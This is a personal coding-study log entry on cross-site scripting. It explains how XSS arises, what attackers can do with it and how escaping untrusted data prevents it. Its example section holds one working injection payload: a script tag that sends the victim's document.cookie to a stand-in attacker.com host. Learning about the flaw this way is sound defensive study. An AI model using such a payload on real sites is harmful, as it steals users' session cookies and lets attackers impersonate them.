# 100 Days of Coding - Log
## Start of Log
**Day 1 - July 24, 2019**
**Subject:** Cross-Site Scripting
**Today's Progress:** I was able to understand the concept of Cross-Site Scripting (XSS), it's use and prevention.

**Thoughts:**
 XSS flaws occur whenever an applications includes untrusted data in a new web page without proper validation or escaping or updates a n existing web page w/ user supplied data using a browser api that can create Javascript

It enables attackers to inject client-side scripts into web pages viewed by other users.

### What does XSS can do?
 - Malicious javascript can be used to do all sorts of malicious attacks because basically, it can access the api or anything that connects to the database. it also can affect the behavior of the page.
- it can be used to steal user cookies that allows the attacker to use the website pretendingto be that user that he stole.

### Example of injections to the `<input>` tags or in the URL:
	`><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>`.

or other HTML Tags like what i've tested `<i>` which transformed the remainder of the elements in the HTML Body into _Italic_.

### Preventions:
 - The preferred option is to properly escape untrusted data based on HTML context that the data will be placed into.
 - avoid passing untrusted data to Javascript and other browser APIs that can generate active content.
